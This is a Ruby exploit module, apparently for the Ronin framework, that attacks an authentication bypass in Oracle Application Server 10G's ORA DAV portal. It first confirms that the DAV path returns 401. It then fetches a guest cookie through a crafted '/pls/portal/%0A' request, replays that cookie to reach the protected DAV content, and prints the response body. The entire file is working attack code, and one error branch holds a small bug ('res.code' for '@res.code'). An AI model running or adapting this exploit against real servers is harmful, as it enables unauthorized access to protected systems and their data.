require 'ronin/exploits/http'

Ronin::Exploits::HTTP.object do

  cache do
    self.name = 'Oracle Application Server 10G ORA DAV Basic Authentication Bypass Vulnerability'
    self.version = '0.1'
    self.description = %{
      This module sends tests for the  Oracle Application Server 10G ORA DAV
      Basic Authentication Bypass Vulnerability.
    }

    author :name => 'CG', :organization => 'carnal0wnage'
    license! :mit

    exploits :auth_bypass
  end

  build do
    @dav_path = '/dav_portal/portal/'
    @guest_path = '/pls/portal/%0A'
  end

  deploy do
    print_info "Testing for dav_portal authentication required"

    @res = http_get(:path => @dav_path)

    unless @res.code == '401'
      print_error "Received HTTP #{@res.code}."
      deploy_failed! "Did not receive a HTTP 401 response: #{@dav_path}"
    end

    print_debug "Received HTTP 401 response."
    print_info "Sending the bypass request ..."

    @res = http_get(:path => @guest_path)

    unless @res.code == '200'
      print_error "Received HTTP #{@res.code}."
      deploy_failed! "Did not receive a HTTP 200 response: #{@guest_path}"
    end

    print_info "Received HTTP 200 for #{@guest_path}"

    if (@cookie = @res.headers['Set-Cookie'])
      print_debug "Received Cookie: %s", @cookie
    end

    print_info "Replaying the HTTP Request with Cookie ..."

    @res = http_get(
      :path => @dav_path,
      :headers => {
        :cookie => @cookie,
        :connection => 'keep-alive'
      }
    )

    unless @res.code == '200'
      print_error "Received HTTP #{res.code}."
      @res.headers.each { |name,value| puts "#{name}: #{value}" }

      deploy_failed! "Could not replay HTTP Request for #{@dav_path}"
    end

    print_info "Response body:"
    puts @res.body
  end

end
